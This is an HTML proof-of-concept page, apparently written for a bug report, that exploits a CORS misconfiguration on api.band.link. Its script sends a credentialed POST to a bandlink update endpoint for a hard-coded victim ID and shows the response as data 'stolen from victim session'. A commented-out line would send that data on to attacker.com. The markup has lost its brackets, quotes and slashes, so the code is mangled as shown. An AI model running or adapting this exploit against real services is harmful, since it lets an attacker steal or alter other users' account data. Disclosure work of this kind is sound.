!DOCTYPE html
html
head
  titleCORS PoC - band.linktitle
head
body
  h2CORS PoC - Stealing Authenticated User Data from api.band.linkh2
  pre id=outputSending request...pre

  script
     Replace with a valid bandlink ID belonging to the victim account
    const payload = {
      selected_domain band.link,
      hex N0Ed7,           victim's bandlink hex
      id 4867715,            victim's bandlink id
      type playlist
       minimal required fields
    };

    fetch(httpsapi.band.linkbandlinkupdate, {
      method POST,
      credentials include,    sends victim's cookies automatically
      headers {
        Content-Type applicationjson
      },
      body JSON.stringify(payload)
    })
    .then(response = response.json())
    .then(data = {
      document.getElementById(output).textContent =
        ✅ Data stolen from victim sessionnn +
        JSON.stringify(data, null, 2);

       In a real attack, send to attacker's server
       fetch(httpsattacker.comcollectd= + encodeURIComponent(JSON.stringify(data)));
    })
    .catch(err = {
      document.getElementById(output).textContent = Error  + err;
    });
  script
body
html